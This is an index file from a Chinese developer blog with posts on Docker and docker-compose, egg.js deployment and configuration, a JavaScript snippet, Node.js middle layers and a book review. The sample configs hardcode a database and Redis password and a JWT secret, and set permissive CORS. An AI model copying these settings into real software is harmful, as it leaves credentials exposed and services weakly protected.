包”，这样就决绝了“开发环境能跑，一上线就崩”的尴尬。</p></blockquote><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">images      List images</span><br><span class="line">ps          List containers</span><br><span class="line">pull        Pull an image or a repository from a registry</span><br><span class="line">push        Push an image or a repository to a registry</span><br><span class="line">rename      Rename a container</span><br><span class="line">restart     Restart one or more containers</span><br><span class="line"><span class="built_in">rm</span>          Remove one or more containers</span><br><span class="line">rmi         Remove one or more images</span><br><span class="line">run         Run a <span class="built_in">command</span> <span class="keyword">in</span> a new container</span><br></pre></td></tr></table></figure><h4 id="快速启动常用软件-有道云笔记"><a href="#快速启动常用软件-有道云笔记" class="headerlink" title="快速启动常用软件 有道云笔记"></a>快速启动常用软件 <a href="http://note.youdao.com/s/XQGk25P1">有道云笔记</a></h4><h3 id="二、Dockerfile"><a href="#二、Dockerfile" class="headerlink" title="二、Dockerfile"></a>二、Dockerfile</h3><h4 id="什么是-dockerfile"><a href="#什么是-dockerfile" class="headerlink" title="什么是 dockerfile?"></a>什么是 dockerfile?</h4><p><code>Dockerfile 是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker 通过读取Dockerfile中的指令自动生成映像。</code></p><p><code>docker build命令用于从 Dockerfile 构建映像。可以在docker build命令中使用-f标志指向文件系统中任何位置的 Dockerfile。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f /path/to/a/Dockerfile</span><br></pre></td></tr></table></figure><h4 id="Dockerfile-文件说明"><a href="#Dockerfile-文件说明" class="headerlink" title="Dockerfile 文件说明"></a>Dockerfile 文件说明</h4><p><code>Docker 以从上到下的顺序运行 Dockerfile 的指令。为了指定基本映像，第一条指令必须是 FROM。一个声明以＃字符开头则被视为注释。可以在 Docker 文件中使用RUN，CMD，FROM，EXPOSE，ENV等指令。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># node镜像</span></span><br><span class="line">FROM node:12-alpine as build-stage</span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;-------------------- web环境配置 --------------------&quot;</span></span><br><span class="line"><span class="comment"># 指定接下来的工作路径为/app  - 类似于cd命令</span></span><br><span class="line">WORKDIR /app</span><br><span class="line"><span class="comment"># 拷贝前端项目到app目录下</span></span><br><span class="line">COPY ./web/package*.json ./</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">RUN npm i --registry=https://registry.npm.taobao.org</span><br><span class="line">COPY ./web ./</span><br><span class="line"><span class="comment"># 打包 - 目的：丢到nginx下跑</span></span><br><span class="line">RUN npm run build:prod</span><br></pre></td></tr></table></figure><h3 id="三、Docker-Compose"><a href="#三、Docker-Compose" class="headerlink" title="三、Docker Compose"></a>三、Docker Compose</h3><h4 id="什么是-docker-compose"><a href="#什么是-docker-compose" class="headerlink" title="什么是 docker-compose?"></a>什么是 docker-compose?</h4><p><code>Docker-compose 是 docker 的服务编排工具，主要是用来构建多个服务，一般是构建构建多个有关联的服务。</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  mysql5.7:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    container_name: mysql</span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;./mysql5.7/data:/var/lib/mysql&quot;</span></span><br><span class="line">      - <span class="string">&quot;./mysql5.7/conf:/etc/mysql/conf.d&quot;</span></span><br><span class="line">      - ./docker/mysql/init:/docker-entrypoint-initdb.d/ <span class="comment">#执行默认脚本</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    user: root:root</span><br><span class="line">    <span class="built_in">tty</span>: <span class="literal">true</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - PROCESS_NUM=1</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=xier0571</span><br><span class="line">      - TZ=Asia/Shanghai</span><br><span class="line">      - TIME_STYLE=<span class="string">&quot;+%F %T&quot;</span></span><br><span class="line">      - LANG=en_US.UTF-8</span><br><span class="line">  redis4:</span><br><span class="line">    image: redis:4</span><br><span class="line">    container_name: redis</span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;./redis4/conf:/usr/local/etc/redis&quot;</span></span><br><span class="line">      - <span class="string">&quot;./redis4/data:/data&quot;</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">    <span class="built_in">tty</span>: <span class="literal">true</span></span><br><span class="line">    restart: always</span><br><span class="line">    <span class="built_in">command</span>: redis-server --requirepass xier0571</span><br></pre></td></tr></table></figure><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">up                 Create and start containers</span><br><span class="line">down               Stop and remove resources</span><br><span class="line">images             List images</span><br><span class="line">ps                 List containers</span><br><span class="line">top                Display the running processes</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Deploy-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>egg  + sequelize + mysql + jwt + vue 全栈项目部署</title>
      <link href="/2021/08/31/compose-deploy/"/>
      <url>/2021/08/31/compose-deploy/</url>
      
        <content type="html"><![CDATA[<h3 id="Egg-spider"><a href="#Egg-spider" class="headerlink" title="Egg-spider"></a>Egg-spider</h3><h4 id="后端-egg-js-jwt-mysql-sequelize-redis-docker-docker-compose-nginx-vue-element-ui-全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署"><a href="#后端-egg-js-jwt-mysql-sequelize-redis-docker-docker-compose-nginx-vue-element-ui-全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署" class="headerlink" title="[后端]egg.js(jwt) + mysql(sequelize) + redis + docker + docker-compose + nginx + vue + element-ui 全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署"></a>[后端]egg.js(jwt) + mysql(sequelize) + redis + docker + docker-compose + nginx + vue + element-ui 全栈获取省市区数据（统计局数据）【工具】项目，实现在docker环境中一键部署</h4><h5 id="1-实现用户注册登录"><a href="#1-实现用户注册登录" class="headerlink" title="1 实现用户注册登录"></a>1 实现用户注册登录</h5><h5 id="2-实现统计局省市区数据的爬取"><a href="#2-实现统计局省市区数据的爬取" class="headerlink" title="2 实现统计局省市区数据的爬取"></a>2 实现统计局省市区数据的爬取</h5><h5 id="3-实现大批量excel测试数据"><a href="#3-实现大批量excel测试数据" class="headerlink" title="3 实现大批量excel测试数据"></a>3 实现大批量excel测试数据</h5><h5 id="4-实现资源的监控"><a href="#4-实现资源的监控" class="headerlink" title="4 实现资源的监控"></a>4 实现资源的监控</h5><h5 id="5-实现羽雀API的调用"><a href="#5-实现羽雀API的调用" class="headerlink" title="5 实现羽雀API的调用"></a>5 实现羽雀API的调用</h5><h5 id="6-实现邮件的发送（基于smtp-qq-com"><a href="#6-实现邮件的发送（基于smtp-qq-com" class="headerlink" title="6 实现邮件的发送（基于smtp.qq.com)"></a>6 实现邮件的发送（基于smtp.qq.com)</h5><h4 id="前端-element-ui-https-github-com-PanJiaChen-vue-admin-template-🙏"><a href="#前端-element-ui-https-github-com-PanJiaChen-vue-admin-template-🙏" class="headerlink" title="[前端] element-ui (https://github.com/PanJiaChen/vue-admin-template) 🙏"></a>[前端] element-ui (<a href="https://github.com/PanJiaChen/vue-admin-template">https://github.com/PanJiaChen/vue-admin-template</a>) 🙏</h4><h5 id="PanJiaChen-大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）"><a href="#PanJiaChen-大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）" class="headerlink" title="PanJiaChen 大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）"></a>PanJiaChen 大佬最精简的一副vue模版（拿来熟悉docker-compose的发布流程）</h5><h3 id="Project-back-end-structure-description"><a href="#Project-back-end-structure-description" class="headerlink" title="Project back end structure description"></a>Project back end structure description</h3><h4 id="app"><a href="#app" class="headerlink" title="app"></a>app</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">├── contract</span><br><span class="line">│   └── type.js     swaggerdoc配置文件</span><br><span class="line">├── controller</span><br><span class="line">│   ├── api</span><br><span class="line">│   │   ├── area.js     省市区乡镇村数据获取</span><br><span class="line">│   │   ├── mock.js     生成mock数据生成Excel文件</span><br><span class="line">│   │   ├── system.js       获取系统资源使用情况</span><br><span class="line">│   │   ├── tool</span><br><span class="line">│   │   │   └── email.js        发送邮件</span><br><span class="line">│   │   ├── user.js</span><br><span class="line">│   │   └── yuque.js        羽雀API调用</span><br><span class="line">│   └── view</span><br><span class="line">│       └── page.js     模版引擎渲染index</span><br><span class="line">├── database</span><br><span class="line">│   └── db.js       model层公用</span><br><span class="line">├── extend</span><br><span class="line">│   ├── application.js      app扩展函数</span><br><span class="line">│   └── helper.js       公用函数封装</span><br><span class="line">├── middleware</span><br><span class="line">│   ├── error_handler.js    成功/出错处理等</span><br><span class="line">│   ├── notfound_handler.js     404处理等</span><br><span class="line">│   └── pagination.js       分页器封装</span><br><span class="line">├── model</span><br><span class="line">│   ├── cities.js       市表</span><br><span class="line">│   ├── districts.js        街道表</span><br><span class="line">│   ├── provinces.js        省表</span><br><span class="line">│   ├── towns.js        乡镇表</span><br><span class="line">│   ├── user.js     用户表</span><br><span class="line">│   └── villages.js     村表</span><br><span class="line">├── public      静态资源文件</span><br><span class="line">├── router      路由表（不赘述）</span><br><span class="line">│   ├── api</span><br><span class="line">│   │   ├── area.js     </span><br><span class="line">│   │   ├── mock.js</span><br><span class="line">│   │   ├── system.js</span><br><span class="line">│   │   ├── tool</span><br><span class="line">│   │   │   └── email.js</span><br><span class="line">│   │   ├── user.js</span><br><span class="line">│   │   └── yuque.js</span><br><span class="line">│   └── view</span><br><span class="line">│       └── page.js</span><br><span class="line">├── service     逻辑处理层</span><br><span class="line">│   ├── area.js     </span><br><span class="line">│   ├── cache.js</span><br><span class="line">│   ├── common.js</span><br><span class="line">│   └── user.js</span><br><span class="line">├── utils       暂无</span><br><span class="line">└── view        未做前后端分离前的模版引擎渲染的页面</span><br><span class="line">    ├── index.html</span><br><span class="line">    └── tool.html</span><br></pre></td></tr></table></figure><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">├── config.default.js   默认配置文件</span><br><span class="line">├── config.local.js     本地开发配置文件</span><br><span class="line">├── config.prod.js      生产配置文件</span><br><span class="line">└── plugin.js       插件配置文件</span><br></pre></td></tr></table></figure><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">├── mysql</span><br><span class="line">│   ├── Dockerfile      mysql镜像文件</span><br><span class="line">│   ├── init</span><br><span class="line">│   │   └── init.sql        初始建库执行的sql   </span><br><span class="line">│   └── mysqld.cnf      mysql配置文件</span><br><span class="line">├── redis</span><br><span class="line">│   ├── Dockerfile      redis镜像文件</span><br><span class="line">│   └── redis.conf      redis配置文件</span><br><span class="line">├── server</span><br><span class="line">│   └── Dockerfile      server镜像文件启动</span><br><span class="line">└── web</span><br><span class="line">    ├── Dockerfile      web build 及 nginx镜像文件</span><br><span class="line">    └── nginx.conf      nginx配置文件</span><br></pre></td></tr></table></figure><h3 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h3><h4 id="server-自行安装docker-amp-docker-compose-amp-amp-node"><a href="#server-自行安装docker-amp-docker-compose-amp-amp-node" class="headerlink" title="server(自行安装docker&amp;docker-compose&amp;&amp;node)"></a><code>server(自行安装docker&amp;docker-compose&amp;&amp;node)</code></h4><h5 id="start-mysql-amp-redis"><a href="#start-mysql-amp-redis" class="headerlink" title="start mysql &amp; redis"></a>start mysql &amp; redis</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose -f docker-compose-dev.yml up     </span><br></pre></td></tr></table></figure><h5 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm i</span><br><span class="line">$ npm run dev</span><br><span class="line">$ open http://localhost:7001/</span><br></pre></td></tr></table></figure><h4 id="web-自行安装node环境"><a href="#web-自行安装node环境" class="headerlink" title="web(自行安装node环境)"></a><code>web(自行安装node环境)</code></h4><h5 id="start-web"><a href="#start-web" class="headerlink" title="start web"></a>start web</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm i</span><br><span class="line">$ npm run dev</span><br><span class="line">$ open http://localhost:9028/</span><br></pre></td></tr></table></figure><h3 id="Deploy-宿主机安装docker-amp-amp-docker-compose"><a href="#Deploy-宿主机安装docker-amp-amp-docker-compose" class="headerlink" title="Deploy(宿主机安装docker&amp;&amp;docker-compose)"></a>Deploy(宿主机安装docker&amp;&amp;docker-compose)</h3><!-- start stop --><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose up</span><br><span class="line">$ docker-compose stop</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Deploy-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> egg </tag>
            
            <tag> nginx </tag>
            
            <tag> docker </tag>
            
            <tag> docker-compose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>egg  + sequelize + mysql + jwt + vue 实现全栈服务（一）</title>
      <link href="/2021/08/26/egg-01/"/>
      <url>/2021/08/26/egg-01/</url>
      
        <content type="html"><![CDATA[<h1 id="Egg-js的常用配置"><a href="#Egg-js的常用配置" class="headerlink" title="Egg.js的常用配置"></a>Egg.js的常用配置</h1><h3 id="一、egg-js常用配置（在config目录下根据不同环境配置-config-default-或config-prod-js）"><a href="#一、egg-js常用配置（在config目录下根据不同环境配置-config-default-或config-prod-js）" class="headerlink" title="一、egg.js常用配置（在config目录下根据不同环境配置 config.default.或config.prod.js）"></a>一、egg.js常用配置（在config目录下根据不同环境配置 <em>config.default.或config.prod.js</em>）</h3><h4 id="1-数据库链接配置"><a href="#1-数据库链接配置" class="headerlink" title="1:数据库链接配置"></a>1:数据库链接配置</h4><pre><code>// mysql config  config.dbConfig = &#123;    database: process.env.DB_DATABASE || &#39;user&#39;,    host: process.env.DB_HOST || &#39;124.70.215.***&#39;,    port: process.env.DB_PORT || &#39;3306&#39;,    username: process.env.DB_USER || &#39;root&#39;,    password: process.env.DB_PASSWORD || &#39;******&#39;,    charset: &#39;utf8mb4&#39;,    collate: &#39;utf8_general_ci&#39;  &#125;</code></pre><h4 id="2-jwt配置"><a href="#2-jwt配置" class="headerlink" title="2:jwt配置"></a>2:jwt配置</h4><pre><code>// jwt 配置  config.jwt = &#123;    secret: &#39;zzestlgcjwtsecret&#39;,    getToken(ctx) &#123;      if (        ctx.headers.authorization &amp;&amp;        (ctx.headers.authorization.split(&#39; &#39;)[0] === &#39;Bearer&#39; ||          ctx.headers.authorization.split(&#39; &#39;)[0] === &#39;Token&#39;)      ) &#123;        return ctx.headers.authorization.split(&#39; &#39;)[1]      &#125; else if (ctx.query &amp;&amp; ctx.query.token) &#123;        return ctx.query.token      &#125;      return null    &#125;  &#125;</code></pre><h4 id="3-跨域配置"><a href="#3-跨域配置" class="headerlink" title="3:跨域配置"></a>3:跨域配置</h4><pre><code>// 跨域配置  config.cors = &#123;    origin: &#39;*&#39;,    allowMethods: &#39;GET, HEAD, PUT, POST, DELETE, PATCH, OPTIONS&#39;  &#125;</code></pre><h4 id="4-部署指定端口配置"><a href="#4-部署指定端口配置" class="headerlink" title="4:部署指定端口配置"></a>4:部署指定端口配置</h4><pre><code>// 指定端口启动config.cluster = &#123;    listen: &#123;      path: &#39;&#39;,      port: 3005,      hostname: &#39;0.0.0.0&#39;,    &#125;  &#125;;</code></pre><h4 id="5-常用插件的配置"><a href="#5-常用插件的配置" class="headerlink" title="5:常用插件的配置"></a>5:常用插件的配置</h4><pre><code>    // Sequelize插件  sequelize: &#123;    enable: true,    package: &#39;egg-sequelize&#39;  &#125;,  // 校验插件  validate: &#123;    enable: true,    package: &#39;egg-validate&#39;  &#125;,  // jwt插件  jwt: &#123;    enable: true,    package: &#39;egg-jwt&#39;  &#125;,  // 子路由  routerPlus: &#123;    enable: true,    package: &#39;egg-router-plus&#39;  &#125;,  // 跨域  cors: &#123;    enable: true,    package: &#39;egg-cors&#39;  &#125;,</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egg-scripts start --daemon 启动于 egg-bin dev 的区别在于前者是在后台运行</span><br></pre></td></tr></table></figure><h5 id="注意项目在dev环境启动的时候要注意package-json中所对应的指令。"><a href="#注意项目在dev环境启动的时候要注意package-json中所对应的指令。" class="headerlink" title="注意项目在dev环境启动的时候要注意package.json中所对应的指令。"></a>注意项目在dev环境启动的时候要注意package.json中所对应的指令。</h5><h5 id="由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下-root-run-application-config-json（worker-进程配置）-和-root-run-agent-config-json（agent-进程配置）-这两个文件。"><a href="#由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下-root-run-application-config-json（worker-进程配置）-和-root-run-agent-config-json（agent-进程配置）-这两个文件。" class="headerlink" title="由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下 ${root}/run/application_config.json（worker 进程配置） 和 ${root}/run/agent_config.json（agent 进程配置） 这两个文件。"></a>由于框架的配置功能比较强大，有不同环境变量，又有框架、插件、应用等很多地方配置，如果配置不生效时可以查看下 ${root}/run/application_config.json（worker 进程配置） 和 ${root}/run/agent_config.json（agent 进程配置） 这两个文件。</h5>]]></content>
      
      
      <categories>
          
          <category> BackEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> egg </tag>
            
            <tag> sequelize </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>世界的阴暗面，和我们假装美好的教育</title>
      <link href="/2021/08/25/book-record/"/>
      <url>/2021/08/25/book-record/</url>
      
        <content type="html"><![CDATA[<h1 id="世界的阴暗面，和我们假装美好的教育"><a href="#世界的阴暗面，和我们假装美好的教育" class="headerlink" title="世界的阴暗面，和我们假装美好的教育"></a>世界的阴暗面，和我们假装美好的教育</h1><p>—-读《房思琪的初恋乐园》有感</p><p>作者：柒祭·落</p><p><code>读完整本小说，整个人都沉浸在那种悲伤中，想到之前看过的《素媛》和《熔炉》，小说中最让我心痛的一个词叫“世界的背面”。如果思琪活在世界的正面，健康快乐的长大，像大多数同龄孩子一样，为考试成绩而忧愁，为同桌的男孩而害羞，就是我们大多数人的人生。可我们都忘了，这个世界还有背面，那些我们无法言说无法体会的痛楚和丑陋，依然在如今这个看似美好的世界，活生生的存在着。</code></p><p>读了小说，看了林奕含的采访视频，发现那个看着温柔美好的女孩子，对文学有着很深的爱，读过的书，书里的人，写书的人，都成为了她的信仰，成为了她深深的爱，而这也成了她对老师又爱又恨的原因。她爱老师和她信仰相同，在她对文学有懵懵懂懂的理解时，老师是那个让她无比崇拜的人，可是在她还没有真正理解文学里的爱时，她崇拜的人却深深的伤害了她。也许最后，林奕含的自杀，不是因为那段痛苦的回忆，而是她无法接受她爱的信仰也有可能只是一种假象。</p><p>那些书写了美好世界，完美爱情的人，在现实世界，却可能是个虐打妻子的暴力男。林奕含无法接受这样的虚假。</p><blockquote><p>最后，让我深思而心痛的是，我们缺失的性教育。</p></blockquote><p>在思琪问妈妈，我们家什么都有，就是没有性教育的时候，妈妈的回答是只有需要性的人才需要性教育，所谓教育不就是这样吗？</p><p>所谓教育不就是这样吗？</p><p>我们需要什么，或者说我们认为孩子需要什么，我们就教给他们什么。可是孩子会在生活中遇到我们以为不会发生的事，而这种时候，孩子会很迷茫，TA不知道什么是对什么是错，也不知道该如何面对。而试探性的问问父母，父母的反应也依旧停留于已有的认知，而没有思考孩子为什么会这么问。思琪的父母如此，怡婷的父母同样，所以怡婷才会在思琪痛苦的时候，没有帮助和陪伴她，反而给了她更多的伤害。因为怡婷也不知道思琪是受到了伤害，她认为这件事超出了教育认知里的常规，所以就是错的。</p><p>纵然有人想努力用各种方式，将这个世界的阴暗面撕开，纵然有很多人在看过后愤怒，心痛，可我们却不得不承认，在愤怒和心痛过之后，我们依然无法阻止这样的事继续发生。我们读书，在书里看到美好的世界，也看到阴暗的世界。这一切，都是真实的，真实的美好，也真实的阴暗，并且，我们无力改变。</p><h3 id="这就是让人最心痛的。"><a href="#这就是让人最心痛的。" class="headerlink" title="这就是让人最心痛的。"></a>这就是让人最心痛的。</h3><p>1991年出生，2017年离世，心痛那个美好姑娘的美好年华，就这样结束。被这个世界的阴暗面，和我们假装美好的教育，合伙谋杀。也许原本，她不用这样过一生。</p>]]></content>
      
      
      <categories>
          
          <category> Reading-Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> perception </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript引用类型的用法</title>
      <link href="/2021/08/21/object-type/"/>
      <url>/2021/08/21/object-type/</url>
      
        <content type="html"><![CDATA[<h4 id="操作数据"><a href="#操作数据" class="headerlink" title="操作数据"></a>操作数据</h4><pre><code>  const originData = [&quot;1#12&quot;, &quot;2#12&quot;, &quot;3#13&quot;, &quot;5#13&quot;, &quot;4#13&quot;, &quot;1#14&quot;];  </code></pre><p><code>#</code>后面为projectId ，前面为modelId</p><h4 id="目标数据"><a href="#目标数据" class="headerlink" title="目标数据"></a>目标数据</h4><pre><code>const targetData = [  &#123; projectId: &quot;12&quot;, modelId: [&quot;1&quot;, &quot;2&quot;] &#125;,  &#123; projectId: &quot;13&quot;, modelId: [&quot;3&quot;, &quot;5&quot;, &quot;4&quot;] &#125;,  &#123; projectId: &quot;14&quot;, modelId: [&quot;1&quot;] &#125;,];</code></pre><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><pre><code> function getList(list) &#123;  const temp = &#123;&#125;; // 定义的临时数据  const arr = [];  list.forEach((val) =&gt; &#123;    // 分割需要用到的数据    const [mid, pid] = val.split(&quot;#&quot;);    // 如果临时数据中存在当前项的projectId，则在temp[pid]值中追加modelId    if (temp[pid]) &#123;      temp[pid].push(mid);    &#125; else &#123;    // 如果不存在临时数据中存储当前projectId对应modelId的值      temp[pid] = [mid];      arr.push(&#123;        projectId: pid,        modelId: temp[pid], // 这里取temp中projectId所对应的值「其实就是引用类型的用法」      &#125;);    &#125;  &#125;);  return arr;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么要有node.js中间层？</title>
      <link href="/2020/08/20/hello-world/"/>
      <url>/2020/08/20/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要有node-js中间层？"><a href="#为什么要有node-js中间层？" class="headerlink" title="为什么要有node.js中间层？"></a>为什么要有node.js中间层？</h3><p>目前流行前后端分离开发方式。虽然这里分离干净了，分工也很明确了，看似一切都那么美好，but…我们也很容易发现问题的所在：<br>1:Client-side Model 是 Server-side Model 的加工<br>2:Client-side View 跟 Server-side是 不同层次的东西<br>3:Client-side的Controller 跟 Sever-side的Controller 各搞各的<br>4:Client-side的Route 但是 Server-side 可能没有</p><p>服务端和客户端各层职责重叠，大家各搞各的，很难统一具体要做的事情。并且可能会伴随着一些性能上的问题。最具体的表现就是我们常用的 SPA 应用：</p><p>1:渲染，取值都在客户端进行，有性能的问题<br>2:需要等待资源到齐才能进行，会有短暂白屏与闪动<br>3:在移动设备低速网路的体验奇差无比<br>4:渲染都在客户端，模版无法重用，SEO 实现 麻烦</p><p>这个就是中间层nodejs的意义，下面我们来看一下常见的业务场景：</p><h4 id="1-接口数据可靠性修复"><a href="#1-接口数据可靠性修复" class="headerlink" title="1. 接口数据可靠性修复"></a>1. 接口数据可靠性修复</h4><p>有的时候服务端返回给我们的数据可能并不是前端想要的结构，所有用到的展现数据都是后端通过异步接口(AJAX/JSONP)的方式提供的，前端只管展现。但是后端经常提供后端的数据逻辑，在前端还需要去处理这些数据逻辑。</p><h4 id="2-页面性能优化-和-SEO"><a href="#2-页面性能优化-和-SEO" class="headerlink" title="2. 页面性能优化 和 SEO"></a>2. 页面性能优化 和 SEO</h4><p>有的时候我们做单页面应用，经常会碰到首屏加载性能问题，这个时候如果我们接了中间层nodejs的话，那么我们可以把首屏渲染的任务交给nodejs去做，次屏的渲染依然走之前的浏览器渲染。（前端换页，浏览器端渲染，直接输入网址，服务器渲染）服务端渲染对页面进行拼接直出html字符串，可以大幅提高首屏渲染的时间，减少用户的等待时间。这种形式应用最广的比如 Vue 的服务端渲染，里面也有相关的介绍。其次对于单页面的SEO优化也是很好地处理方式，由于目前的ajax并不被搜索百度等搜索引擎支持，所以如果想要得到爬虫的支持，那么服务端渲染也是一种解决方法。</p><h4 id="3-淘宝常见的需求解决方案"><a href="#3-淘宝常见的需求解决方案" class="headerlink" title="3. 淘宝常见的需求解决方案"></a>3. 淘宝常见的需求解决方案</h4><p>需求：在淘宝，单日四亿PV，页面数据来自各个不同接口，为了不影响体验，先产生页面框架后，在发起多个异步请求取数据更新页面，这些多出来的请求带来的影响不小，尤其在无线端。解决方案：在 NodeJS 端使用 Bigpiper 技术，合并请求，降低负担，分批输出，不影响体验。同时可以拆分大接口为独立小接口，并发请求。串行 =&gt; 并行，大幅缩短请求时间。</p>]]></content>
      
      
      <categories>
          
          <category> BackEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
